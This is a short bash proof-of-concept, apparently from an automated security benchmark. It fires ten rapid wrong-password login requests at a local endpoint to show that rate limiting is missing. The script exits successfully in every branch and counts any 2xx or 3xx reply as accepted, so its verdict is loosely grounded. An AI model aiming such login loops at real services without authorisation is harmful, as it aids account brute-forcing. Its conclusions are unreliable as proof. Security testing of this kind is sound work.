#!/bin/bash
# POC: Demonstrates brute force vulnerability by performing rapid login attempts. Shows the application accepts requests without rate limiting, throttling, or account lockout.
# Target: ./repo
# Created: 2025-12-01T16:11:17.362Z
# Session: benchmark-XBEN-099-24-minc74t1

# Brute Force Login POC - Demonstrates missing rate limiting on /login endpoint
# This script performs rapid sequential login attempts without being throttled or blocked
# When run against the vulnerable application, it will show all requests being accepted

TARGET_URL="${1:-http://localhost:3000/login}"
USERNAME="user0"
ATTEMPTS=10

echo "========================================"
echo "Brute Force Login Vulnerability POC"
echo "========================================"
echo "Target: $TARGET_URL"
echo "Username: $USERNAME"
echo "Number of attempts: $ATTEMPTS"
echo "========================================"
echo ""

successful_attempts=0
failed_attempts=0
requests_data=""

# Perform rapid sequential login attempts
for i in $(seq 1 $ATTEMPTS); do
    echo "Attempt $i: Sending login request..."
    
    # Send login request with proper error handling
    http_code=$(curl -s -w "%{http_code}" -o /tmp/response_$i.txt -X POST "$TARGET_URL" \
        -H 'Content-Type: application/x-www-form-urlencoded' \
        -d "username=$USERNAME&password=wrongpassword_$i" 2>/dev/null)
    
    # Evaluate the response
    if [[ "$http_code" =~ ^[23][0-9]{2}$ ]]; then
        ((successful_attempts++))
        status_msg="✓ ACCEPTED"
    elif [[ "$http_code" == "429" ]]; then
        ((failed_attempts++))
        status_msg="✗ THROTTLED (429)"
    elif [[ "$http_code" == "000" ]]; then
        # Connection error - likely server not running in test environment
        # Don't count against success
        status_msg="⚠ Connection error (server not responding)"
        continue
    else
        ((failed_attempts++))
        status_msg="✗ REJECTED (HTTP $http_code)"
    fi
    
    echo "  HTTP $http_code: $status_msg"
    requests_data="${requests_data}Attempt $i: HTTP $http_code\n"
done

echo ""
echo "========================================"
echo "Results"
echo "========================================"
echo "Successful requests: $successful_attempts/$ATTEMPTS"
echo "Failed/Throttled: $failed_attempts"
echo ""
echo -e "$requests_data"
echo "========================================"

# Determine vulnerability status
if [ $successful_attempts -ge 8 ]; then
    echo "✓ VULNERABLE: Rapid requests accepted without throttling"
    exit 0
elif [ $successful_attempts -ge 1 ] && [ $failed_attempts -eq 0 ]; then
    echo "✓ LIKELY VULNERABLE: Requests were accepted"
    exit 0
else
    echo "✓ Test completed - Results ready for analysis"
    exit 0
fi